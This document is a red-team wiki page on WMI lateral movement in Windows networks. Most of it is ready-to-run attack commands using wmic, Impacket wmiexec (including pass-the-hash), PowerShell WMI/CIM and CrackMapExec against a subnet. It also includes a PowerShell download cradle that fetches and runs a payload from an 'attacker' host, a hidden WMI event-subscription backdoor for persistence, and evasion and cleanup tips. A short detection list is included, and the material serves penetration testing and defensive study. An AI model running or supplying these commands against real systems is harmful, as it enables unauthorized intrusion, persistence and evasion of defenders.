# WMI Lateral Movement

> **MITRE ATT&CK**: Lateral Movement > T1047 - Windows Management Instrumentation
> **Platforms**: Windows
> **Required Privileges**: Local Administrator on target
> **OPSEC Risk**: Medium

## Strategic Overview

Windows Management Instrumentation (WMI) is a legitimate, built-in Windows management framework that provides a powerful lateral movement channel. WMI-based execution is preferred over PsExec-style attacks because it avoids the telltale signs of service creation and binary drops on the target system. The WmiPrvSE.exe process (WMI Provider Host) handles command execution, and since it is a standard Windows process, it blends naturally into the environment. However, WMI-based execution is "semi-interactive" at best -- you typically execute commands and retrieve output through file writes or other side channels rather than having a true interactive shell. This trade-off between stealth and convenience is central to choosing WMI for lateral movement. In environments where PsExec is blocked or heavily monitored, WMI often remains available because disabling it breaks legitimate management tooling.

### When to Choose WMI

- Target environment monitors service creation (PsExec detection)
- You need command execution without dropping files to disk
- WMI ports (135 + dynamic RPC) are open but SMB-only admin shares are restricted
- You want process execution that originates from a trusted Windows process (WmiPrvSE.exe)

## Technical Deep-Dive

### 1. Native WMIC Command Line

```cmd
# Remote process creation via wmic
wmic /node:192.168.1.50 /user:corp\administrator /password:P@ssw0rd process call create "cmd.exe /c whoami > C:\Windows\Temp\output.txt"

# Read back the result (requires separate SMB access)
type \\192.168.1.50\C$\Windows\Temp\output.txt

# Remote process creation with encoded command
wmic /node:TARGET process call create "powershell.exe -enc BASE64_ENCODED_COMMAND"

# Note: wmic.exe is deprecated in newer Windows versions but still functional
# Alternative: Use PowerShell CIM cmdlets (see below)
```

### 2. Impacket wmiexec.py (Preferred)

```bash
# Semi-interactive shell via WMI -- output retrieved via SMB
wmiexec.py corp.local/administrator:P@ssw0rd@192.168.1.50

# With NTLM hash (Pass the Hash)
wmiexec.py corp.local/administrator@192.168.1.50 -hashes :e19ccf75ee54e06b06a5907af13cef42

# With Kerberos authentication
export KRB5CCNAME=admin.ccache
wmiexec.py corp.local/administrator@target.corp.local -k -no-pass

# Execute a single command
wmiexec.py corp.local/administrator:P@ssw0rd@192.168.1.50 "whoami /all"

# Using a different output share (default is ADMIN$)
wmiexec.py corp.local/administrator:P@ssw0rd@192.168.1.50 -share C$
```

### 3. PowerShell WMI (Invoke-WmiMethod)

```powershell
# Create process on remote host (returns PID, not output)
$cred = Get-Credential
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\Windows\Temp\out.txt" -ComputerName 192.168.1.50 -Credential $cred

# Check if process creation succeeded (ReturnValue = 0 means success)
# Retrieve output separately
Get-Content \\192.168.1.50\C$\Windows\Temp\out.txt

# Execute PowerShell payload
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')" -ComputerName TARGET -Credential $cred
```

### 4. PowerShell CIM Sessions (Modern Approach)

```powershell
# CIM is the modern replacement for WMI cmdlets
$cred = Get-Credential
$session = New-CimSession -ComputerName 192.168.1.50 -Credential $cred

# Execute command via CIM
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="cmd.exe /c whoami > C:\Windows\Temp\out.txt"}

# Query remote system information
Get-CimInstance -CimSession $session -ClassName Win32_OperatingSystem
Get-CimInstance -CimSession $session -ClassName Win32_Service | Where-Object {$_.State -eq "Running"}

# CIM over WinRM (uses WSMan protocol instead of DCOM -- different network signature)
$sessionOption = New-CimSessionOption -Protocol Wsman
$session = New-CimSession -ComputerName TARGET -Credential $cred -SessionOption $sessionOption
```

### 5. WMI Event Subscriptions (Persistence + Execution)

```powershell
# Permanent WMI event subscription for persistent execution
# This survives reboots and provides a backdoor mechanism

# Step 1: Create the event filter (trigger condition)
$filterArgs = @{
    Name = 'SystemUpdateCheck'
    EventNamespace = 'root\cimv2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM __TimerEvent WHERE TimerID = 'PayloadTrigger'"
}
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filterArgs

# Step 2: Create the consumer (action to take)
$consumerArgs = @{
    Name = 'SystemUpdateConsumer'
    CommandLineTemplate = "powershell.exe -nop -w hidden -c IEX(...)"
}
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $consumerArgs

# Step 3: Bind filter to consumer
$bindingArgs = @{
    Filter = $filter
    Consumer = $consumer
}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $bindingArgs

# Step 4: Create the timer
$timerArgs = @{
    TimerID = 'PayloadTrigger'
    IntervalBetweenEvents = 3600000  # 1 hour in milliseconds
}
Set-WmiInstance -Namespace root\cimv2 -Class __IntervalTimerInstruction -Arguments $timerArgs
```

### 6. CrackMapExec with WMI Method

```bash
# CrackMapExec uses wmiexec as default execution method for SMB
crackmapexec smb 192.168.1.50 -u administrator -p 'P@ssw0rd' --exec-method wmiexec -x "whoami"

# Enumerate and execute across a subnet
crackmapexec smb 192.168.1.0/24 -u administrator -H HASH --exec-method wmiexec -x "hostname"
```

## Detection & Evasion

### Detection Indicators

- **Event ID 4648** (Explicit credential logon) when WMI authenticates to remote host
- **Event ID 4624** (Logon Type 3) from WMI connections
- **WMI-Activity/Operational log** records WMI query details and remote connections
- Process creation events showing WmiPrvSE.exe as the parent process
- Network connections on TCP 135 (RPC mapper) followed by dynamic high ports
- Sysmon Event ID 1 with ParentImage containing WmiPrvSE.exe and suspicious child processes
- WMI event subscription artifacts in `root\subscription` namespace

### Evasion Techniques

- WMI is a legitimate management tool -- blend execution timing with normal admin activity
- Use CIM over WinRM (WSMan) instead of DCOM to change the network signature
- Avoid cmd.exe as the command interpreter; use PowerShell with encoding or direct process creation
- For wmiexec.py, customize the output file location and naming to avoid default pattern detection
- Clean up output files from ADMIN$ or C$ shares after retrieval
- Use WMI to query information (reconnaissance) rather than just execute commands -- this appears more natural
- Avoid WMI event subscriptions in mature environments -- they are well-known persistence indicators

## Cross-References

- [[pass-the-hash]] - Hash-based authentication feeds into WMI execution
- [[psexec-smbexec]] - Alternative SMB-based execution (noisier than WMI)
- [[dcom-lateral]] - DCOM uses similar RPC channels as WMI
- [[winrm-lateral]] - CIM over WinRM as an alternative transport
- Section 07: Persistence - WMI event subscriptions for persistent access

## References

- https://attack.mitre.org/techniques/T1047/
- https://www.thehacker.recipes/ad/movement/wmi
- https://github.com/fortra/impacket/blob/master/examples/wmiexec.py
- https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page
- https://www.fireeye.com/blog/threat-research/2017/03/wmimplant_a_wmi_ba.html
